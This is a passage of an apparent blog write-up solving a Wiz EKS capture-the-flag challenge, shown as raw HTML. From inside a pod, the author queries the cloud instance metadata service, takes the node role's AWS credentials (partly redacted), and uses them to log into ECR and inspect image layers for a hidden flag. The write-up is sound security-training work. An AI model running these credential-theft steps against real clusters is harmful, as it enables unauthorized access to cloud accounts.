data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    ]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  }\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLooks like they leaked the secret right there in the image layers:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"\" data-theme=\"default\"\u003e\u003ccode data-language=\"\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #adbac7\"\u003ewiz_eks_challenge{nothing_can_be_said_to_*REDACTED*}'\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo lets submit that and move onto the next one!\u003c/p\u003e\n\u003ch1\u003eChallenge 3\u003c/h1\u003e\n\u003cp\u003eThe hint is:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"\" data-theme=\"default\"\u003e\u003ccode data-language=\"\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #adbac7\"\u003eA pod's image holds more than just code. Dive deep into its ECR repository,\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #adbac7\"\u003einspect the image layers, and uncover the hidden secret.\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #adbac7\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #adbac7\"\u003eRemember: You are running inside a compromised EKS pod.\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis sounds very similar to the last one but with the hints that its on ECR and\nthat we are in the pod itself it makes me believe we'll have something like IRSA\naccess to AWS from the pod and need to use that to get to it.\u003c/p\u003e\n\u003cp\u003eFirst lets check what pods we are working with:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ekubectl\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eget\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003epod\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eNAME\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                      \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eREADY\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e   \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eSTATUS\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eRESTARTS\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e   \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eAGE\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eaccounting-pod-876647f8\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e   \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e1\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e/1\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e     \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eRunning\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e   \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e0\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e          \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e37\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eh\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo same as the last challenge, lets get the image and see what access we have:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ekubectl\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eget\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003epod\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e-o\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ejson\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e|\u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003ejq\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e'.items[0].spec.containers[0].image'\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e\"688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01\"\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhich as expected, we do not have access to:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ecrane\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003econfig\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e688655246681\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eError:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003efetching\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003econfig:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ereading\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eimage\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01\":\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eGET\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ehttps://688655246681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-aaf4a7c/manifests/sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eunexpected\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003estatus\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ecode\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e401\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eUnauthorized:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eNot\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eAuthorized\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSince I expect the pod already has AWS access, lets check if the AWS CLI works:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eaws\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ests\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eget-caller-identity\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e \u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eUnable\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eto\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003elocate\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ecredentials.\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eYou\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ecan\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003econfigure\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ecredentials\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eby\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003erunning\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"aws configure\".\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCredentials are not configured right now, so we need to discover them.  Lets\ncheck if we have metadata server access:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ecurl\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ehttp://169.254.169.254/latest/meta-data/iam\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003einfo\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003esecurity-credentials/\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe do!  So we should be able to pull the credentials out of there to get access\nto AWS:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ecurl\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e-sS\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ehttp://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e|\u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003ejq\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"AccessKeyId\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"ASIA2AVYNE\u0026#x3C;*REDACTED*\u003e\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"Expiration\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"2023-11-03 03:50:19+00:00\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"SecretAccessKey\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"e4TuLKKPBAVvyPkhKiJG0jO0\u0026#x3C;*REDACTED*\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"SessionToken\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"FwoGZXIvYXdzEBQaDAM9SyNaDBowmWoT1SK3AbqDZUQpyn\u0026#x3C;*REDACTED*\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLets set those as environment variables to activate our AWS access:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F47067\"\u003eexport\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e AWS_ACCESS_KEY_ID\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e=\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"ASIA2AVYNE\u0026#x3C;*REDACTED*\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F47067\"\u003eexport\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e AWS_SECRET_ACCESS_KEY\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e=\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"e4TuLKKPBAVvyPkhKiJG0jO0\u0026#x3C;*REDACTED*\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F47067\"\u003eexport\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e AWS_SESSION_TOKEN\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e=\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"FwoGZXIvYXdzEBQaDAM9SyNaDBowmWoT1SK3AbqDZUQpyn\u0026#x3C;*REDACTED*\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e \u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eaws\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ests\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eget-caller-identity\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"UserId\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"ASIA2AVYNE\u0026#x3C;*REDACTED*\u003e:i-0cb922c6673973282\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"Account\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"688655246681\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"Arn\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow we should be able to authenticate crane and inspect the image from ECR:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eexport\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ePASSWORD=$(\u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003eaws\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e ecr get-login-password)\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ecrane\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eauth\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003elogin\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e-u\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eAWS\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e-p\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e $PASSWORD \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e688655246681\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e.dkr.ecr.us-west-1.amazonaws.com\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  \u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e2023/11/03\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e02\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e:56:41\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003elogged\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ein\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003evia\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e/home/user/.docker/config.json\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLets get those layers!\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ecrane\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003econfig\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e688655246681\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e|\u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003ejq\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"architecture\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"amd64\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"config\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"Env\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e [\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    ],\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"Cmd\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e [\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"/bin/sleep\"\u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e,\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"3133337\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    ],\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"ArgsEscaped\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003etrue\u003c/span\u003e\u003cspan 